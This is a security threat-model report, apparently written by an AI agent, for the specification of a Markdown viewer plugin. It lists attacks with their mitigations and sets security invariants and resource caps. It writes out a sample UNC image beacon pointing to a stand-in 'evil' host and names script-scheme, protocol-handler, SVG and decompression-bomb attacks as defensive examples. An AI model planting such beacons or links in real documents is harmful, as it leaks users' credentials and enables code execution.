# Agent 4 — Security Analysis (raw report, specify phase)

Independent analysis. Precedent skim: feature 006 (specs/006-fix-pictview-
plugin/research.md) = untrusted images decoded in-process via Windows WIC on
worker threads, non-crashing stubs, animation degraded to frame 0; WIC has no
SVG codec; no shipped component embeds a browser engine (only a build-time help
tool references MSHTML).

## Threat model (attack → impact → required spec-level mitigation)

1. **Raw HTML script/event handlers** (`<script>`, onerror/onload/onclick,
   autofocus+onfocus) → arbitrary code in the Salamander process → rendering
   pipeline MUST NOT contain a reachable script engine; raw HTML rendered
   inert; no DOM event model for content.
2. **Script-scheme URIs** (`javascript:`, `vbscript:`, obfuscated/entity-
   encoded variants) → script on click → scheme check on the *decoded,
   canonicalized* URL; allowlist only (blocklists forbidden).
3. **Custom/registered protocol schemes** (ms-msdt:, search-ms:, Follina
   class) → RCE via handler → every scheme not allowlisted blocked, including
   unknown ones.
4. **`file:`/UNC links** → click-to-execute + mere *resolution* leaks NTLM
   hash/IP via SMB → blocked; no URL resolved/probed/prefetched before
   explicit click.
5. **Image refs as beacons (UNC/absolute)** — `![x](\\evil\p\i.png)` →
   render-time SMB connection = hash+IP leak with zero clicks → local images
   MUST accept **relative paths only**, canonicalized against the document
   dir; absolute/drive/UNC/file:/device (`\\?\`, `\\.\`)/ADS refs → error
   placeholder, never opened. (`../` traversal allowed per brief §6; result
   opened read-only as data, never executed.)
6. **Remote image beacons (http/https tracking pixels)** → discloses open
   time/IP/fingerprint per recipient → NO network I/O on open; placeholders;
   any fetch requires explicit gesture, http/https only, redirects restricted,
   no cookies/credentials.
7. **SVG script/external refs/XXE** → script or hidden fetch via "image" path
   → SVG only via a static, script-free, non-fetching rasterizer with
   DTD/external entities disabled; otherwise placeholder. Never routed through
   an HTML engine.
8. **Decompression-bomb images** (40000×40000 ≈ 6 GB; frame bombs; thousands
   of images) → OOM/freeze → hard caps: decoded dimensions, per-image + total
   memory, image count; lazy viewport decode; animation may degrade to first
   frame (006 precedent); over-limit → placeholder with reason.
9. **Parser DoS** (100k-deep nesting, quadratic emphasis, reference
   expansion, 100 MB single line) → UI hang / stack overflow in the single UI
   process → documented linear-time parsing; hard nesting cap with literal
   degradation; no unbounded recursion; output-size cap; parse/render off the
   UI thread, cancelable, hard timeout → text-viewer fallback.
10. **iframe/object/embed/applet** → forbidden outright (brief §8); must be
    inert/absent under ANY HTML policy ever adopted.
11. **Forms/auto-submit** (`formaction`, `<input type=image>` beacon) → never
    interactive; no submission machinery exists.
12. **meta-refresh / auto-navigation** → inert; invariant: no navigation of
    any kind without explicit user gesture.
13. **CSS-driven fetches** (style/url()/@import/@font-face/srcset) → content
    MUST NOT introduce styles that trigger any resource fetch (restate as
    invariant so a future sanitization mode cannot regress it).
14. **Link-text spoofing / Unicode deception** (mismatched text vs target,
    homoglyphs, RTL override) → real canonicalized target visible before
    activation; copy = plain text only (CF_UNICODETEXT, no CF_HTML); SHOULD
    neutralize/reveal bidi controls at least in code blocks.
15. **Clipboard abuse** → writes only on explicit user command, plain text.
16. **Oversized document** → size ceiling + text-viewer fallback; AST/layout
    memory ceilings.
17. **Encoding attacks** (overlong UTF-8, invalid sequences, NULs) → robust
    decode, U+FFFD replacement, never crash; downstream operates on validated
    text only.
18. **TOCTOU on reload** → all limits/policies re-apply on every (re)load;
    missing file → clean error.

## Recommended policies for v1

- **Raw HTML: option (b) — ALL raw HTML rendered as inert literal text**
  (visibly, code-like styling). (a) sanitization whitelist = best README
  fidelity but sanitizers are the historically weakest link (mXSS, parser
  differentials) — safety maintained, not provable → rejected for v1.
  (c) silent strip = hides content (spoofing/inconsistency) → rejected.
  HTML *entity* decoding is data-level, safe, required by §5 — entities
  decode, tags stay inert. Upgrade path (v2+, separate security review):
  strictly parsed attribute-less micro-subset (`<br>`, `<b>`, `<i>`, `<sub>`,
  `<sup>`, `<details>/<summary>`).
- **Remote images: blocked by default; per-document, per-session consent**
  via explicit "Load remote images" action; placeholders (alt + host) until
  then. If a global "always allow" setting exists at all, shipped default
  stays blocked/ask; consent never silently widens. On consent: http/https
  only, redirect-restricted, no cookies/credentials/custom headers, hardened
  decode path, off UI thread, timeout.
- **Links**: activation only by explicit gesture (click or Enter on focused
  link). Allowlist for external open: `http`, `https`, `mailto`. Blocked:
  javascript, vbscript, data, file, about, and every non-allowlisted scheme
  including unknown. Decision on decoded canonicalized URL; target shown
  before activation. `#anchor` scrolls in-document only.
- **Local-file navigation**: relative links to Markdown files navigate
  inside mdview (read-only, limits re-applied). Links to any OTHER local file
  are **not launched** in v1 (one click must never ShellExecute an arbitrary
  exe/lnk/document); show resolved path, offer copy-path (optionally reveal
  in panel). Confirmation-gated "open with associated app" only as explicit
  product decision (open question 3). Absolute/UNC/file: targets blocked
  entirely.
- **Rendering surface (assurance requirement, not design choice)**: the spec
  requires the chosen implementation to *demonstrate* every invariant — by
  construction or by test. Record: a static layout renderer satisfies "no
  script engine, no network on open" **by construction**; a browser-engine
  embed (WebView2) turns every invariant into configuration that must be
  enforced and re-verified across engine auto-updates, plus runtime
  distribution and process-model implications. No shipped Salamander
  component embeds a browser engine today. If a browser engine is chosen at
  plan phase, the plan MUST enumerate per-invariant enforcement + a
  re-verification strategy.

## Non-negotiable security invariants (spec MUSTs)

1. Opening/rendering MUST NOT execute any script, under any input.
2. Opening/rendering MUST NOT launch any command, application, or protocol
   handler.
3. Opening/rendering MUST NOT perform any network I/O (HTTP(S), SMB/UNC,
   WebDAV, DNS) — no fetch/probe/prefetch/resolution without a subsequent
   explicit user gesture.
4. No HTML event handler may ever attach/fire; iframe/object/embed/applet,
   forms, meta-refresh never active under any HTML policy.
5. Local resource access from content is read-only, relative-path-only,
   canonicalized against the document dir; absolute/UNC/device/file: refused;
   nothing referenced is ever executed.
6. Link activation requires an explicit gesture; schemes allowlisted
   (http/https/mailto), decided on canonicalized URLs; all else blocked
   including unknown schemes.
7. Untrusted input of any size/nesting/malformation MUST NOT crash, hang the
   UI thread, or exhaust memory: parsing/decoding/layout off the UI thread,
   cancelable, bounded by resource limits, degrading to error or text-viewer
   fallback.
8. Clipboard written only on explicit user command, plain text only.
9. SVG (if rendered) via static, script-free, non-fetching rasterizer with
   XML external entities/DTD disabled; otherwise placeholder.
10. All policies and limits re-apply on every reload/refresh.

## Resource-limit requirements (defaults proposed; existence of each cap is
the requirement)

- Rendered-view document size cap: 16 MB proposal; above → text-viewer offer.
- Nesting depth cap: 64; beyond → literal text. No unbounded recursion.
- Linear-time parser documented; AST node count + output size capped vs input.
- Time budget: worker thread; progress/cancel if > ~2 s; hard abort ~10 s;
  UI thread never blocked beyond interactive latency.
- Images: max decoded dimensions ~50 MP; total decoded memory ~256 MB; eager
  count cap with lazy viewport decode; frame cap (first frame OK).
- Tables: column/cell caps before degrading.
- Per-document ceilings fully released on close (50× cycle leak-free).

## Risks / assurance notes

- The Markdown parser is the largest attack surface: require GPLv2-compatible,
  actively maintained, documented pathological-input behavior (cmark/md4c both
  advertise linear-time), pinned version, fuzz/adversarial corpus in
  acceptance tests.
- Sanitizer trap: reopening HTML option (a) later needs a dedicated security
  review (mXSS class), not a routine edit.
- SVG reality: WIC cannot decode SVG; Direct2D's SVG subset is script-free
  and non-fetching (only obvious platform-native candidate); nanosvg is the
  vendored option; otherwise placeholder — spec must not promise SVG before
  plan confirms a safe renderer.
- No OS sandbox: viewer runs in-process at full user privilege — no second
  line of defense; "no active content" must be absolute.
- Residual risks to record: visual deception (homoglyphs/bidi) only
  surfaced, not eliminated; consented remote loads still leak IP/timing to
  the image host — consent UI should name host(s).

## Open questions (ranked)

1. Remote images: confirm blocked + per-document consent; global
   "always allow" advanced setting in v1 — yes or no?
2. Raw HTML: confirm (b) inert literal; schedule reviewed safe-subset later?
3. Local non-Markdown file links: shown-but-not-launched (recommended) vs
   confirmation-gated open?
4. Renderer class: may plan phase consider a browser engine at all, or does
   the spec mandate a static script-free renderer outright?
5. External link confirmation: open on click with hover-visible target, or
   confirmation dialog (first/every)?
